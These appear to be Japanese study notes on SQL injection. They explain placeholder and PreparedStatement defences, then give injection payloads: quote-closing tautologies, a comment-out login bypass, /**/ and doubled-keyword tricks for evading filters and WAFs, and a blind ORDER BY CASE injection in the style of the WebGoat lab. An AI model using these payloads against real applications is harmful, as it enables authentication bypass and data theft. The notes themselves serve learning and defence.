
Webアプリケーションに対してデータベースへの命令文を構成する不正な入力データを与え、Webアプリケーションが想定していないSQL文を意図的に実行させることで、データベースを破壊したり情報を不正取得したりする攻撃
- 対策：SQLインジェクションは、利用者が入力した値をそのままSQL文の一部として使ってしまうことで攻撃が成立します。==プレースホルダ==は、利用者入力部分に特殊文字（?など）を割り当てたSQL文のひな形を用意し、特殊文字部分には実行時にエスケープ処理された値を割り当てる仕組みです。SQLインジェクションを狙った不正な文字が含まれていたとしても、SQL文の命令文の一部ではなく、単なる値として認識されるため安全に実行することができます。 
```PHP
_//PHPにおけるプレースホルダの一例_  
$uid = $_POST["userid"];  
$sql = 'SELECT * FROM USER WHERE uid = ?' _//?がプレースホルダ_  
$pdo = new PDO($dbh, $user, $password);  
$stmt = $pdo->prepare($sql);  
$stmt->execute([$uid]); _//?に値を割り当てて実行_
```
　Javaでは、通常の（文字列組立）SQL文を、`Statement`[[Javaの特徴#JavaのSQL]]と呼ばれ、プレースホールダーを使用するSQL文を`PreparedStatement`と、変数を定義する時もそれぞれ違うタイプの変数が使われる。
　セキュリティリスクが存在する点と、処理効率の点から、原則的には`Statement`を使用せず、`PreparedStatement`を使用することが推奨されるが、以下のようば場合では`Statement`しか使用できない:
　1. 動的なテーブル名やコラム名が使用される場合
　2. DDL（Data Defination Language)文の実行（CREATE TABLEなど）
　   以上二点が実行されない理由は、Javaの`PreparedStatement`タイプは、固定したSQLに対して、パラメータを埋め込むという2段階式になるので、SQLを固定した段階ではすでにその解読と列の確認を全て済ませておいた、パラメータが挿入されるまでに存在しない表や、コラムを指定すると、SQLの解読をそもそもできないから、以上な場合は文字列組立タイプの`Statement`を使用する
```java
　   // 動的なテーブル名を使用する例（PreparedStatementでは不可）
String tableName = "users_" + year;
Statement stmt = conn.createStatement();
stmt.executeQuery("SELECT * FROM " + tableName);
```

　3. 一度きりの実行で、ユーザー入力を含まないSQL

`PreparedStatement`を使用する例：
```java
// SQLインジェクションを防止
String sql = "SELECT * FROM users WHERE name = ?";
PreparedStatement pstmt = conn.prepareStatement(sql);
pstmt.setString(1, userInput);
// 入力値が適切にエスケープされる
```
   
- ==**サニタイジング**(sanitizing)==は、ユーザの入力値を受け取り処理するWebアプリケーションにおいて、入力データ中のスクリプトやコマンドとして特別な意味を持つ文字があった場合、HTML出力やコマンド発行の直前でエスケープ処理し無害化する操作です。
- Static query:プレースホルダー化以上の、リスクの低減する方法。キーとなる値は、セッションに保存されるパラメーター値などを使用してプレースホルダーに代入することで、SQLの脆弱性を改善する
  

### 文字列組立式SQL文のインジェクション
#### ''をクローズすることによってインジェクションを実施
SQLでは条件を''で囲むので、条件文にその他の条件を埋め込むことや、右'をコメントアウトする符号を埋め込むことで、''を異常にクローズさせることでインジェクションを達成することができる。
1. 条件埋め込み:
   ```SQL
   ...
   WHERE condition = '$keyword'

   外部入力:
   keyword = injection' and 'a' = 'a

   組立結果:
   WHERE condition = 'injection' and 'a' = 'a' (True and True)
```
 　上記例の`'a' = 'a'`の他に、`1 = 1`も同様な効果を達成することはできるが、組立式では埋め込むに工夫が必要になる
 　```SQL
 　外部入力:
 　keyword = injection' and 1 = 1
```
```SQL
 　組立結果:
 　WHERE condition = 'injection' and 1 = 1' (右''がクローズされていない, syntax error)
```
```SQL
　　対策:
　　keyword = injection' and 1 = 1--'

   組立結果:
 　WHERE condition = 'injection' and 1 = 1--'
```
2. コメントアウト
   SQLのコメントアウト符号`--`で追加条件を回避する
   ```SQL
   ...
   WHERE user = '$userid' and pswd = '$pswd'
   
   外部入力:
   userid = user1' --
```
```SQL
   組立結果:
   WHERE user = 'user1' --' and pswd = '$pswd'
```

3. スペースフィルタリング対策
**Code Obfuscation** From a security perspective, `/**/` can be used in SQL injection attacks to bypass security filters. Attackers might insert these comments to:

- Break up SQL keywords that might be detected by security filters
- Hide malicious code
- Bypass WAF (Web Application Firewall) rules
```sql
SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/='admin'
```

4. キーワードフィルタリング対策
クエリ内の、SQLキーワードをフィルタリングすることで、サブクエリを禁止する手法。
```sql
select * from users where username = 'admin'
->
*users where username = 'admin' (キーワードselectとfromがフィルタリングされた)
```
このようなフィルタリングに対策するには、キーワードの中にキーワードを差し込み、フィルタリングすることで逆にキーワードを組み立てしてくれるように、キーワードを2重に書くことで、キーワードフィルタリングを突破することができる
```sql
seselectlect/**/*/**/frfromom/**/users;--
->
select/**/*/**/from/**/users;--
```

5. Placeholderへの攻撃手法
SQLインジェクション対策として、placeholderを導入したシステムや、固定値でquery実施しているシステムでも、order byの条件にインジェクションされる可能性がある。
order byはselect文と組み合わせることもできるので、条件を組み合わせることでサーバの真偽回答でデータを推測することができる
```sql
select id, hostname, ip, mac, status, description from servers where status <> 'out of order' order by case when (select ip from servers where hostname = 'webgoat-prd') like '192%' then ip else hostname end
```